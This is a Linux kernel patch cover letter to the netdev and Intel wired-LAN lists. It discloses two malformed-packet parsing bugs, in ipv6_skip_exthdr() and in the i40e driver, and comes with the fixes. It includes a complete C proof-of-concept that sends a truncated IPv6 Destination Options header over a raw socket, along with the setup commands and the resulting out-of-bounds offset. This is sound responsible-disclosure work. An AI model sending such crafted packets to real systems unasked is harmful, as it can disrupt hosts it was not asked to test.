Return-Path: <intel-wired-lan-bounces@osuosl.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id B6B75CA5FA5
	for <intel-wired-lan@archiver.kernel.org>; Mon, 28 Sep 2026 15:13:37 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp1.osuosl.org (Postfix) with ESMTP id 7EC9080DE4;
	Mon, 28 Sep 2026 15:13:37 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id WO9e60tVJ-7d; Mon, 28 Sep 2026 15:13:36 +0000 (UTC)
ARC-Filter: OpenARC Filter v1.3.0 smtp1.osuosl.org 8961C80EB0
Authentication-Results: smtp1.osuosl.org; arc=pass header.oldest-pass=0 smtp.remote-ip=140.211.166.142
ARC-Seal: i=2; d=osuosl.org; s=arc; a=rsa-sha256; cv=pass; t=1790608416;
	b=be8C5U4b7vRdqXYBEQCrSJVvoVddrjTEcHGvnN3Bfvul3QMypA26DziY+MFWnnA4ARwT
	 ff2EXr6Eb//JShv/bEXsu3HuvtNeCx/lMOGgF4Bu01NR+I0jczhb32kTwXRoVLXoSpGmm
	 dKioQ+FSag/+WwMy8oVepRFEvpTx6NyhAKzHe5d8F3AznTeMCqMB8DCk+dvswTWj4xb4K
	 yFq0GQKH9ce43bMPaUtXS37ia1R/sXM9CK3fM9ph51G4PAyra+TicOZ7sbYb2dGxNaIYv
	 SzvH35oHBWXn1ws8vADssIjLTmT+UVZcqv6/4WUPkiowctk08rGTG26Ff88lEkJhGbA==
ARC-Message-Signature: i=2; d=osuosl.org; s=arc; a=rsa-sha256;
	c=relaxed/relaxed; t=1790608416;
	h=X-Comment:DKIM-Signature:X-Original-To:Delivered-To:Received:
	 Received:X-Virus-Scanned:X-Spam-Flag:X-Spam-Score:X-Spam-Level:
	 X-Spam-Status:Received:ARC-Filter:Received-SPF:Received:Received:
	 DKIM-Signature:X-Google-DKIM-Signature:X-Forwarded-Encrypted:
	 X-Gm-Message-State:X-Gm-Gg:X-Received:Received:From:To:Cc:Subject:
	 Date:Message-ID:X-Mailer:MIME-Version:Content-Transfer-Encoding:
	 X-Mailman-Approved-At:X-BeenThere:X-Mailman-Version:Precedence:
	 List-Id:List-Unsubscribe:List-Archive:List-Post:List-Help:
	 List-Subscribe:Errors-To;
	bh=kCQtC+BQECPfQicHLZsZ+lH5EE0Cb6sIIYRK2yNnRA8=;
	b=lDndPHtQZ9oqpiWOjF4+5dHPXr/2aLz8MbE0B1zC/USZwSLtLUknxWKm7raW+HhsuJ/G
	 LtS7vfgXJRBzrSXRBiTrGDBXPtHMFojGW/no0w0hbZqinWQrtUByKJoJ92TBJ4BzH7OQt
	 R/bcXUegXE1hdysXz/AFgkaJ4n2FlBURzcL+QWUctvvaAXdvtpOc4U4bXYAVMvGP3vz2Z
	 yoo4ZqFf8BIOfe7ODuOReZBeCI51zzsKZoyYF2UfHkVW1A+QADc9FFklFUFYLfiXDltM+
	 85rHno/U7MxaFhW8r4Rd2a/aBIqjAk8nCydRHQFjbw9Ih20diI+1WY7OtE1AtC7q54Q==
ARC-Authentication-Results: i=2; smtp1.osuosl.org; dmarc=pass header.from=nebusec.ai;
	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b="C4/8RhKE";
	arc=pass header.oldest-pass=0 smtp.remote-ip=140.211.166.142
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.142; helo=lists1.osuosl.org; envelope-from=intel-wired-lan-bounces@osuosl.org; receiver=<UNKNOWN> 
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=osuosl.org;
	s=default; t=1790608416;
	bh=kCQtC+BQECPfQicHLZsZ+lH5EE0Cb6sIIYRK2yNnRA8=;
	h=From:To:Cc:Subject:Date:List-Id:List-Unsubscribe:List-Archive:
	 List-Post:List-Help:List-Subscribe:From;
	b=HMCAgGQTmgI9Ae2ic4i3B9IQAR3xi3fjpeFA03Xqqqb3KdmeI/Ni4l2iuUWNOLAZn
	 4Fzq7Nh+IeCV5eZg5Wpp1eG334I9yhjIaC/4w3FzFqLicq2fs2Q2hMMTQ03DurHi5B
	 C9Y2V7N/9IpCJq8z6W71P1UY51753WSOMNmNGZDNq3vsqbdpXto/mtmMZWG9Fva1a6
	 0gNpHYD3K3uUR1V0LJO9CX0TmaCDnZQ0oEjgWcnlhbD+1pAqolO4oIF6GfBkg9WDnM
	 tGoPiF/IpKeLm+VddJteOR+FoLj7LD9mvr4GZV2WJXSCAraX2xYcbkjbePqpmXyAHV
	 mX6d1fJXRLXtQ==
Received: from lists1.osuosl.org (lists1.osuosl.org [140.211.166.142])
	by smtp1.osuosl.org (Postfix) with ESMTP id 8961C80EB0;
	Mon, 28 Sep 2026 15:13:36 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [IPv6:2605:bc80:3010::138])
 by lists1.osuosl.org (Postfix) with ESMTP id D36D3335
 for <intel-wired-lan@lists.osuosl.org>; Sat, 26 Sep 2026 18:23:25 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id C4E53810DB
 for <intel-wired-lan@lists.osuosl.org>; Sat, 26 Sep 2026 18:23:25 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id PNlU-jdPVVO6 for <intel-wired-lan@lists.osuosl.org>;
 Sat, 26 Sep 2026 18:23:25 +0000 (UTC)
ARC-Filter: OpenARC Filter v1.3.0 smtp1.osuosl.org AD5C4810D9
Authentication-Results: smtp1.osuosl.org;
 arc=none smtp.remote-ip="2607:f8b0:4864:33::10"
ARC-Seal: i=1; d=osuosl.org; s=arc; a=rsa-sha256; cv=none; t=1790447005;
 b=rjVJ8DUEVSi5v30whzXinm0HrwoJHyOWeA+IQK+6dLoJ0ouQVWoUQAG5TL1uyAG0n9pu
 +soXlOnjx7h+9Qr3lPsRh3eVtk1w8QZo3T+M/XibQUYNhPPLJ1vrdMrDT9eeuvRK9d1Rm
 DRuWOdnYMEnd8BN6YptpTdBfADCeG1Kc5fEcsZJptmRINjBlkWuBOpNmbAwagEC4oanlf
 mTZ2X0BmwS1ZzjN5DKFf0bx6wCOhA6kypE4mtDoxKq56iJYZF4mQYUPtiJmFfU0UDfqMY
 4v+oRQO5SeNnfucUroBsV9exLwi54Jdwxjnq5llK9H7buWFAjKb4ngTQYFSUzYCj3hw==
ARC-Message-Signature: i=1; d=osuosl.org; s=arc; a=rsa-sha256;
 c=relaxed/relaxed; t=1790447005;
 h=Received-SPF:Received:DKIM-Signature:X-Google-DKIM-Signature:
 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
 From:To:Cc:Subject:Date:Message-ID:X-Mailer:MIME-Version:
 Content-Transfer-Encoding;
 bh=kCQtC+BQECPfQicHLZsZ+lH5EE0Cb6sIIYRK2yNnRA8=;
 b=as48J3lehOsO2wuVq31jJ4woUOlqBXXeDFeKh/K5eulXK0h4n+yqJ7+UMLHY65N/Wy5B
 mx23E/ovVt5GU/r80pWeyefAQDRu3EPX4go8hOZgbi82mFZwCgZjUuh0dZJEt4QEaH0oM
 IoE8XbtWln40TANrQ+tSMRN3Mk6ib59QQfpiHUTAtTn0Lyh0AYfn0RB3rPkODiwbCrbiJ
 ySQdSYdBCMgpp+aIo75OO3lIYKcA8eHm4d6pINZPOa7+R1Pv1WVHlaEuEnfOfrylymsbm
 bB1umRdmLpcCOYbjlX30w59o3e4eB3Bw7EOw3gT3hwb2Evjz82Enbv2PZWJT5bpnnRQ==
ARC-Authentication-Results: i=1; smtp1.osuosl.org;
 dmarc=pass header.from=nebusec.ai; 
 dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256
 header.s=google header.b="C4/8RhKE"; 
 arc=none smtp.remote-ip="2607:f8b0:4864:33::10"
Received-SPF: Pass (mailfrom) identity=mailfrom;
 client-ip=2607:f8b0:4864:33::10; helo=mail-qv2-x10.google.com;
 envelope-from=weir@nebusec.ai; receiver=<UNKNOWN> 
Authentication-Results: smtp1.osuosl.org; dmarc=pass (p=quarantine dis=none)
 header.from=nebusec.ai
Authentication-Results: smtp1.osuosl.org; dkim=pass (2048-bit key,
 unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256
 header.s=google header.b=C4/8RhKE
Received: from mail-qv2-x10.google.com (mail-qv2-x10.google.com
 [IPv6:2607:f8b0:4864:33::10])
 by smtp1.osuosl.org (Postfix) with ESMTPS id AD5C4810D9
 for <intel-wired-lan@lists.osuosl.org>; Sat, 26 Sep 2026 18:23:24 +0000 (UTC)
Received: by mail-qv2-x10.google.com with SMTP id
 6a1803df08f44-910704e63a9so7733086d6.0
 for <intel-wired-lan@lists.osuosl.org>; Sat, 26 Sep 2026 11:23:24 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=nebusec.ai; s=google; t=1790447003; x=1791051803; darn=lists.osuosl.org;
 h=content-transfer-encoding:mime-version:message-id:date:subject:cc
 :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
 bh=kCQtC+BQECPfQicHLZsZ+lH5EE0Cb6sIIYRK2yNnRA8=;
 b=C4/8RhKENi7otEDOD500l2E0a2DxCP2IjuLWFEA7CBbFRpr1gEuMXfcFjvQV0wGCt3
 zXPksk3obSwA1+i9c3CygEKLd5U2+sBzXnyudDHnCHKK6CnJnk5ahkf2AGDORmgYXQ0U
 NFDSf4cE/A/b4p3HFvfuLvnIblRUN76ZvNia//5iX5umHon+2lKdyk3jTegXybZCBKQO
 Y108nlbsMLUP1JuwBE66u8T9MIqsXXGWyfqr0qFtfLZwMt31qIl2txYA6H1Sb70FJ9Ws
 L9c9xK1DhDIZB2jTA+vEPlIHOX/D4TJry5YZKBt+N0/31LYJz4yZTBZbj5DlgQrwondi
 ObmQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=1e100.net; s=20260707; t=1790447003; x=1791051803;
 h=content-transfer-encoding:mime-version:message-id:date:subject:cc
 :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
 :message-id:reply-to:content-type;
 bh=kCQtC+BQECPfQicHLZsZ+lH5EE0Cb6sIIYRK2yNnRA8=;
 b=Z/V3lh4PHi/J7DEnR0EhpiRomdQY8fKoFMYb5eCRVTLE9hnzdOjxcWsloz901RVVJo
 wGcdkAhUKK7NWXzBYiX/sD7+CyQ6EgOu53myl2pltzpNtJ3QpspbpwH1tAqbclz95Hp3
 HoIREPta9g+4qa7+gQqVT6WaVNkRK3uYIKupXHa+VX1yWZPpVIMW0ztESM3TLMgxnSSJ
 Q0w+YizFdacFA0OpWUG/Dsjr1qg0mTkNVoeELMs+9TD0tBp92C9p9Xyv/kGjkxW/TrGk
 7mThCXHZiC9YnMAFrLxC2PlXrqkXEoYifVI+lSHhtrVmG6KJ8jRB8aOp4gy8AOgFIB+K
 i+wQ==
X-Forwarded-Encrypted: i=1;
 AKwUvByutfS6gMeLe0FoLV3Od2EREBc1fbfHrpopHNqvKR3acyjZ5UtVZuM1yxkQ8Xr9KTAQXxRkeUXSFsgjgm9OX48=@lists.osuosl.org
X-Gm-Message-State: AFq9FYLbKPgy5gu5P8xIgbnAuUsCOCUFaMKdjHOqPsGSNsk4WHXjPtu9
 6IMA+j+CfrmZ7b95noi3qOnQ+tQSjVvocq4aYvyUjQG6rBON+L5MOAu2fkY0dzDE2dfI
X-Gm-Gg: AYBFou1bM0+ubOzio2Ldr+fNLn2WNd0/Wds048+C6ft8c4tfuIMav0SpnhKN+HoOOWR
 9JweDdv89d/is0AMng0EbQcgVeuldyofpI032I/7/7A1+18JXBVRJ9Y8C2DVSTQu0mp2EECiENB
 71GdMGvDgmpA/riV4GP/jxwiBdgYbAF0mfD+kYc7P8psCv5TNM1Khpw8Qw9h48ukUdwgXfHhsLj
 gEiMILPlz5JdMJ+hLWIQ86Up7q2bvUS+p8I8VMPCaGenmWmyXRsckkmkTWxC5Z+PF7xxTD8fD8d
 8d7UQ8KO9+IBAqi25nYJW0Rl/3vI3jpK24mHc0GLW2R1pi3r70sLgqS5qnkOrinIClooFHxg4Ly
 n4LuUMIqBY6sppxfnDkTaHQNG7banEIUqn5v2OEzE7XmNmlse8uL/DLwnW7+C2H4rNzDdYvKHFJ
 xXwFAyPNUJBlnwFHObcOo7QU6ya98MTGDuusvu33JxrIgujKbjdA6ZISqpjdwv1JLerHrMvUDw0
 ZwOl7o=
X-Received: by 2002:a05:6214:5005:b0:914:4aa4:4f62 with SMTP id
 6a1803df08f44-9144aa4804amr42587326d6.14.1790447002728; 
 Sat, 26 Sep 2026 11:23:22 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([202.8.105.119])
 by smtp.gmail.com with ESMTPSA id
 6a1803df08f44-91430ec87e3sm43970006d6.47.2026.09.26.11.23.13
 (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
 Sat, 26 Sep 2026 11:23:22 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: netdev@vger.kernel.org,
	intel-wired-lan@lists.osuosl.org
Cc: dsahern@kernel.org, idosch@nvidia.com, davem@davemloft.net,
 edumazet@kernel.org, kuba@kernel.org, pabeni@redhat.com, horms@kernel.org,
 steffen.klassert@secunet.com, herbert@gondor.apana.org.au,
 lucien.xin@gmail.com, anthony.l.nguyen@intel.com,
 przemyslaw.kitszel@intel.com, jbrandeb@kernel.org, sln@onemain.com,
 fw@strlen.de, petalzu987@gmail.com, weir@nebusec.ai
Subject: [PATCH net v1 0/2] net: validate malformed IPv6 and TCP headers
Date: Sun, 27 Sep 2026 02:23:07 +0800
Message-ID: <cover.1790082243.git.petalzu987@gmail.com>
X-Mailer: git-send-email 2.53.0
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-Mailman-Approved-At: Mon, 28 Sep 2026 15:13:34 +0000
X-BeenThere: intel-wired-lan@osuosl.org
X-Mailman-Version: 2.1.30
Precedence: list
List-Id: Intel Wired Ethernet Linux Kernel Driver Development
 <intel-wired-lan.osuosl.org>
List-Unsubscribe: <https://lists.osuosl.org/mailman/options/intel-wired-lan>, 
 <mailto:intel-wired-lan-request@osuosl.org?subject=unsubscribe>
List-Archive: <http://lists.osuosl.org/pipermail/intel-wired-lan/>
List-Post: <mailto:intel-wired-lan@osuosl.org>
List-Help: <mailto:intel-wired-lan-request@osuosl.org?subject=help>
List-Subscribe: <https://lists.osuosl.org/mailman/listinfo/intel-wired-lan>,
 <mailto:intel-wired-lan-request@osuosl.org?subject=subscribe>
Errors-To: intel-wired-lan-bounces@osuosl.org

From: Zixuan Chai <petalzu987@gmail.com>

Hi Linux kernel maintainers,

This series fixes two malformed-packet parsing issues found in the
networking stack. The first is in net/ipv6/exthdrs_core.c: a truncated
IPv6 extension header can make ipv6_skip_exthdr() return an offset past
the end of the skb. The second is in the i40e driver: i40e_atr() can
dereference a TCP header without first checking that the complete header
is present in the skb.

The direct IPv6 reproducer reaches the affected netfilter caller when
run as root and demonstrates the invalid offset. We did not establish
ordinary non-root reachability for this caller. The i40e and XFRM BEET
paths were compile-checked and reviewed, but were not runtime-tested
because the QEMU guests did not provide the required hardware or
offload device.

We've tested the IPv6 changes in clean and patched QEMU guests. Complete
extension headers and the tested IPv6 reassembly behavior remain intact.

We will provide detailed information about the bug in this email,
along with the complete PoC source.

---- details below ----

Bug details:

Patch 1 fixes the IPv6 parser. ipv6_skip_exthdr() derives the
extension-header length from hdrlen and advances the offset without
first checking that the complete header is present in the skb. A
truncated Destination Options header can therefore make it return an
offset past skb->len.

The fix rejects the header when its calculated length exceeds the
remaining skb data, before reading the next-header value or advancing
the offset. Consumers that use the returned offset now handle -1 as a
malformed packet: IPv6 fragment reassembly rejects a malformed first
fragment, ICMPv6 does not send an error reply, and XFRM BEET GSO aborts
before updating the transport offset. Complete extension headers retain
their existing behavior.

Patch 2 fixes a separate length check in i40e_atr(). ipv6_find_hdr()
can identify TCP as the next protocol without proving that a complete
struct tcphdr is present. The patch checks the remaining skb data before
i40e_atr() inspects TCP flags.

Reproducer:

    gcc -O2 -Wall -Wextra -o poc poc.c
    ip link add veth0 type veth peer name veth1
    ip link set dev veth0 address 52:36:9e:3a:43:2d
    ip link set dev veth1 address 02:00:00:00:00:02
    ip -6 addr add 2001:db8:5252::1/64 dev veth0
    ip link set veth0 up
    ip link set veth1 up
    nft add table ip6 caller_probe
    nft add chain ip6 caller_probe input \
        '{ type filter hook input priority 0; policy accept; }'
    nft add rule ip6 caller_probe input iifname veth0 \
        counter reject with icmpv6 type port-unreachable

The commands above require root privileges and were run directly in an
x86 QEMU guest with 2 vCPUs and 2 GB of RAM.

For the packet-level observation, we temporarily added the following
debug print in nf_reject_v6_csum_ok(), immediately after its
ipv6_skip_exthdr() call in net/ipv6/netfilter/nf_reject_ipv6.c:

    pr_info("skip caller=reject6_csum offset=%d skb_len=%u proto=%u\n",
            thoff, skb->len, proto);

The temporary change was not included in the submitted patch. On each
kernel, we cleared the log, ran poc directly, and checked the result
with:

    dmesg -C
    ./poc veth1 52:36:9e:3a:43:2d 2001:db8:5252::1
    poc_rc=$?
    echo "poc_rc=$poc_rc"
    dmesg | grep 'skip caller=reject6_csum'
    nft list chain ip6 caller_probe input

Additional validation:

The direct helper and consumer probe ran in matching clean and patched
QEMU guests as root. All 25 assertions passed in both guests. The key
Destination Options case declared a 2048-byte header while only 8 bytes
were available:

- clean: ipv6_skip_exthdr() returned offset 2048
- patched: ipv6_skip_exthdr() returned -1

The shared fragment consumer likewise returned false on the clean kernel
and true on the patched kernel for a truncated extension header. The
packet-level runner completed with expanded_poc=PASS on both kernels,
and the final fault scan found no BUG, Oops, KASAN report, panic, or
soft-lockup. These tests establish behavior in root QEMU guests only;
they do not prove non-root or user-namespace reachability.

------BEGIN poc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/ipv6.h>
#include <net/if.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

static int parse_mac(const char *text, unsigned char *mac)
{
	unsigned int values[ETH_ALEN];

	if (sscanf(text, "%x:%x:%x:%x:%x:%x",
		   &values[0], &values[1], &values[2], &values[3],
		   &values[4], &values[5]) != ETH_ALEN)
		return -1;

	for (size_t index = 0; index < ETH_ALEN; index++) {
		if (values[index] > 0xff)
			return -1;
		mac[index] = (unsigned char)values[index];
	}

	return 0;
}

static int get_interface_mac(const char *interface, unsigned char *mac)
{
	struct ifreq request;
	int socket_fd;
	int result;

	socket_fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (socket_fd < 0)
		return -1;

	memset(&request, 0, sizeof(request));
	strncpy(request.ifr_name, interface, IFNAMSIZ - 1);
	result = ioctl(socket_fd, SIOCGIFHWADDR, &request);
	if (result == 0)
		memcpy(mac, request.ifr_hwaddr.sa_data, ETH_ALEN);
	close(socket_fd);
	return result;
}

static void print_usage(const char *program)
{
	fprintf(stderr,
		"usage: %s <interface> <destination-mac> <destination-ipv6>\n",
		program);
}

int main(int argc, char **argv)
{
	unsigned char source_mac[ETH_ALEN];
	unsigned char destination_mac[ETH_ALEN];
	unsigned char frame[ETH_HLEN + sizeof(struct ipv6hdr) + 8];
	struct ipv6hdr *ip6;
	struct sockaddr_ll address;
	struct in6_addr destination;
	const char *interface;
	int socket_fd;
	int interface_index;
	ssize_t sent;
	unsigned int hdrlen = 255;

	if (argc != 4) {
		print_usage(argv[0]);
		return 2;
	}

	interface = argv[1];
	if (parse_mac(argv[2], destination_mac) < 0) {
		fprintf(stderr, "invalid destination MAC: %s\n", argv[2]);
		return 2;
	}
	if (inet_pton(AF_INET6, argv[3], &destination) != 1) {
		fprintf(stderr, "invalid destination IPv6 address: %s\n", argv[3]);
		return 2;
	}
	if (get_interface_mac(interface, source_mac) < 0) {
		perror("SIOCGIFHWADDR");
		return 1;
	}

	interface_index = (int)if_nametoindex(interface);
	if (interface_index == 0) {
		perror("if_nametoindex");
		return 1;
	}

	memset(frame, 0, sizeof(frame));
	memcpy(frame, destination_mac, ETH_ALEN);
	memcpy(frame + ETH_ALEN, source_mac, ETH_ALEN);
	frame[12] = ETH_P_IPV6 >> 8;
	frame[13] = ETH_P_IPV6 & 0xff;

	ip6 = (struct ipv6hdr *)(frame + ETH_HLEN);
	ip6->version = 6;
	ip6->payload_len = htons(8);
	ip6->nexthdr = IPPROTO_DSTOPTS;
	ip6->hop_limit = 64;
	inet_pton(AF_INET6, "2001:db8:5252::2", &ip6->saddr);
	ip6->daddr = destination;

	frame[ETH_HLEN + sizeof(struct ipv6hdr)] = IPPROTO_TCP;
	frame[ETH_HLEN + sizeof(struct ipv6hdr) + 1] = hdrlen;

	socket_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IPV6));
	if (socket_fd < 0) {
		perror("AF_PACKET/SOCK_RAW");
		return 1;
	}

	memset(&address, 0, sizeof(address));
	address.sll_family = AF_PACKET;
	address.sll_protocol = htons(ETH_P_IPV6);
	address.sll_ifindex = interface_index;
	address.sll_halen = ETH_ALEN;
	memcpy(address.sll_addr, destination_mac, ETH_ALEN);

	sent = sendto(socket_fd, frame, sizeof(frame), 0,
		      (struct sockaddr *)&address, sizeof(address));
	if (sent < 0) {
		perror("sendto");
		close(socket_fd);
		printf("send_rc=-1 errno=%d\n", errno);
		return 1;
	}

	printf("send_rc=%zd\n", sent);
	close(socket_fd);
	return sent == (ssize_t)sizeof(frame) ? 0 : 1;
}
------END poc.c--------

----BEGIN test output----

send_rc=62
poc_rc=0
[  456.953986] skip caller=reject6_csum offset=2088 skb_len=48 proto=6
table ip6 caller_probe {
        chain input {
                type filter hook input priority filter; policy accept;
                iifname "veth0" counter packets 1 bytes 48 reject
	}
}

----END test output----

Zixuan Chai (2):
  ipv6: reject truncated extension headers in ipv6_skip_exthdr()
  i40e: validate TCP header before ATR access

---
 drivers/net/ethernet/intel/i40e/i40e_txrx.c |  3 +++
 include/net/ipv6_frag.h                     |  4 +++-
 net/ipv4/esp4_offload.c                     |  8 ++++++--
 net/ipv6/esp6_offload.c                     |  8 ++++++--
 net/ipv6/exthdrs_core.c                     | 14 +++++++-------
 net/ipv6/icmp.c                             |  2 +-
 6 files changed, 26 insertions(+), 13 deletions(-)

-- 
2.34.1
